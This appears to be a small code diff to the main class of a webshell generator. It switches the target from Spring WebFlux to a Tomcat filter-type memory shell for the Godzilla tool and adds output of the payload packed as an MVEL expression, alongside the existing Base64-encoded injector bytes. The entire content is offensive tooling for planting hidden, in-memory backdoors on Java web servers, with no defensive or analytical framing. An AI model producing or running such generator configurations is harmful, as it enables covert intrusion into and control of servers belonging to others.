@@ -20,9 +20,9 @@ public class GeneratorMain {
 
     public static void main(String[] args) throws IOException {
         ShellConfig shellConfig = ShellConfig.builder()
-                .server(Server.SpringWebFlux)
+                .server(Server.Tomcat)
                 .shellTool(ShellTool.Godzilla)
-                .shellType(SpringWebFluxShell.NETTY_HANDLER)
+                .shellType(Constants.FILTER)
                 .targetJreVersion(Opcodes.V1_8)
                 .debug(true)
                 .build();
@@ -45,6 +45,7 @@ public class GeneratorMain {
 //            Files.write(Paths.get(generateResult.getInjectorClassName() + ".class"), generateResult.getInjectorBytes(), StandardOpenOption.CREATE_NEW);
 //            Files.write(Paths.get(generateResult.getShellClassName() + ".class"), generateResult.getShellBytes(), StandardOpenOption.CREATE_NEW);
             System.out.println(Base64.encodeBase64String(generateResult.getInjectorBytes()));
+            System.out.println(Packers.MVEL.getInstance().pack(generateResult));
 //            Files.write(Path.of("target.jar"), Packer.INSTANCE.AgentJar.getPacker().packBytes(generateResult));
         }
     }
